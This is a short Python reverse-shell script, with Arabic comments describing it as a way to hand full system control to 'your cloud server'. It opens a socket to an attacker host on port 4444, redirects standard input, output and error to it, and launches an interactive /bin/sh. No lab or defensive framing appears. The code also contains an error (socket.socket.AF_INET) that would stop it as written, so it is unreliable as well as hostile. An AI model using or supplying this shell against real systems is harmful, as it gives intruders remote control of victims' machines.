import socket
import os
import subprocess

# إحداثيات سيرفرك السحابي (الذي سيستقبل السيطرة)
LHOST = 'عنوان_IP_سيرفرك' 
LPORT = 4444

def connect():
    s = socket.socket(socket.socket.AF_INET, socket.socket.SOCK_STREAM)
    try:
        s.connect((LHOST, LPORT))
        # فتح بوابة تحكم كاملة بالنظام
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        subprocess.call(["/bin/sh", "-i"])
    except:
        pass

if __name__ == "__main__":
    connect()
